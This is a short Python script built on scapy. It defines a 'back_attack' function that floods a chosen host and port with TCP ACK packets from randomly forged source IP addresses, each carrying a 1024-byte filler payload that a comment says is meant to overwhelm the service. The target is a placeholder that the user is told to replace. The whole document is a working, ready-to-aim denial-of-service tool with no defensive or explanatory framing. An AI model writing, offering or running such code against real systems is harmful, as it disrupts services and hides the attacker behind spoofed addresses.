from scapy.all import send, IP, TCP
import random

def back_attack(target_ip, target_port, packet_count):
    for _ in range(packet_count):
        src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
        payload = "A" * 1024  # Example of a simple large payload to overwhelm the service
        packet = IP(src=src_ip, dst=target_ip) / TCP(dport=target_port, flags="A") / payload
        print("packet: " + str(packet))
        send(packet, verbose=True)

target_ip = "127.0.0.1"  # Replace with the target IP address
target_port = 9999            # Replace with the target port
packet_count = 10         # Number of packets to send

back_attack(target_ip, target_port, packet_count)
